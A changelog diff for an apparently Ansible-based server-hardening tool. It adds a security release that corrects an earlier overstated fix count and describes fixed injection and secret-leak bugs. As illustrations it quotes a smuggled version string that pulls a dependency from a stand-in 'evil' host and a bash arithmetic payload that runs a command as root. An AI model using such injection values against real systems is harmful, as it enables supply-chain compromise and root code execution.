@@ -10,13 +10,107 @@ changes. Treat it as early-stage — see the
 
 ## [Unreleased]
 
-_Nothing yet._
+**Security release — completes 0.3.0. Upgrade promptly.**
+
+### Correction to the 0.3.0 notes
+
+The 0.3.0 entry below originally said *"59 issues were found and fixed."*
+**Both parts of that were wrong.** The audit produced **89** findings — the 59
+was counted before the last of five audit areas (the scripts, role 10 and
+role 11) had finished — and 0.3.0 did not fix all of them. Overstating a
+security fix is itself the kind of false assurance `SECURITY.md` classes as a
+bug, so this is called out rather than quietly edited. This release fixes the
+remainder; the findings deliberately left unchanged are listed at the end with
+reasons, so the claim is checkable.
+
+### Fixed — data from outside your control
+
+- **`scripts/cve-pr.sh` — OSV data reached a regex replacement and package
+  managers.** A fixed-version string from `api.osv.dev` was used as an
+  `re.sub` *replacement*, where backslash escapes are interpreted: a value like
+  `1.0\n-e git+https://evil/pkg` would add an attacker's dependency to the pull
+  request you then merge. The replacement is now a function, so the version is
+  inserted literally, and every package name and version is validated (no
+  whitespace, control characters, backslash, quotes or leading `-`) before it is
+  written to the plan, passed to a package manager, or used in a regex.
+- **CVE scanner (role 11)** now validates package names (from lockfiles) and
+  fixed versions (from OSV) per ecosystem, drops anything malformed, and builds
+  the displayed fix command with `shlex.quote` so a copy-pasted command can never
+  do more than it says.
+- **The wizard trusted `api.ipify.org`.** Its response was offered as the
+  default break-glass IP unvalidated; it is now only used if it parses as an IP.
+
+### Fixed — the setup wizard (`scripts/configure.sh`)
+
+- **YAML injection into `host_vars` (critical).** Values were written as
+  `echo "key: \"${VAR}\""`, so a typed `"` or `\` broke out of the string and
+  could add arbitrary keys — including ones preflight never checks. All 25 write
+  sites now emit single-quoted YAML scalars, inside which YAML interprets nothing
+  but `''`.
+- A value containing a newline (typically a `.pub` file holding several keys)
+  now **aborts** the wizard. Previously the guard ran inside `$(...)`, where an
+  `exit` only ends the subshell, so the wizard carried on and wrote an empty
+  value.
+- `app_port`, the server address, the chat id and the bot token are validated as
+  they are typed.
+- **The bot token is no longer on a `curl` command line**, where any local user
+  can read it with `ps`. That matters because in local mode the wizard runs on
+  the server itself. Calls now pass the URL to `curl -K -` on stdin.
+
+### Fixed — secrets in logs
+
+- A failed Telegram alert logged the exception text, which **contains the
+  request URL, which contains the bot token** — into journald, and on first
+  deploy into Ansible's output. Only the status code is logged now.
+- `no_log: true` added to the `watcher.conf` and `cve-watch.conf` template tasks
+  (both render the token); 0.3.0 had missed them.
+
+### Fixed — other
+
+- `tests/redteam.sh` read integers from config into `$(( ))`. Bash arithmetic
+  evaluates array subscripts, so a value like `a[$(cmd)]` executes `cmd` as root.
+  Values must now be plain integers.
+- Preflight now also validates `inventory_hostname` (a path component in the
+  report), `app_port` (nginx `proxy_pass`), `pg_version` (a path component),
+  `client_name` (the client-facing report) and `cve_watch_min_severity`.
+  `ssh_port` is coerced with `| int` in the fwknop role too.
+- An unfilled template now fails with a clear **"still a CHANGE_ME
+  placeholder"** message instead of a misleading "unsafe shape".
+- B2 key validation was relaxed to a permissive charset. Backblaze does not
+  publish the key format, and a validator that rejects a real key is a bug of its
+  own; only characters that could inject into `rclone.conf` are excluded.
+
+### Deliberately not changed
+
+Ten findings involve input that only the operator controls, in operator-only
+tooling, where the realistic attacker would have to already own the operator's
+machine. They are accepted rather than fixed:
+
+- `bootstrap.sh` — `SECURE_DEPLOY_REPO` env var and the clone directory.
+- `release.sh`, `cve-pr.sh` — the repo slug derived from your own `git remote`.
+- `cve-pr.sh` — the `--branch` argument (quoted), and advisory summaries
+  rendered as markdown into a PR description you review before merging.
+- `configure.sh` — `eval "$RUN_CMD"`, built only from the validated server name.
+- Role 02 — `ssh_public_key_file`, a path looked up on your own control machine.
+- `tests/redteam.sh` — `app_users`, quoted, read from a root-owned file.
+- Role 04 — the network interface name from host facts, which the kernel
+  limits to 15 non-whitespace characters.
+
+Four more are mitigated by other fixes and were not changed directly: the
+detector's peer address from `ss` (only reaches the now-validating
+`block_ip`), the evidence-file tag (code constants, not input), the OSV response
+body (parsed as JSON, values validated downstream), and a wizard log-leak report
+that no longer reproduces.
 
 ## [0.3.0] - 2026-10-14
 
+> **Correction:** this entry originally claimed "59 issues were found and
+> fixed". The audit found 89, and not all were fixed here. See the next release
+> above for the correction and the remainder.
+
 **Security release — upgrade promptly.** A codebase-wide audit found a class of injection bugs
 where a variable's *value* could stop being data and become part of a command,
-a file path, or a config directive. 59 issues were found and fixed.
+a file path, or a config directive.
 
 **Realistic impact today:** most of these variables are typed by the operator,
 so exploiting them meant attacking your own infrastructure. The reason they are
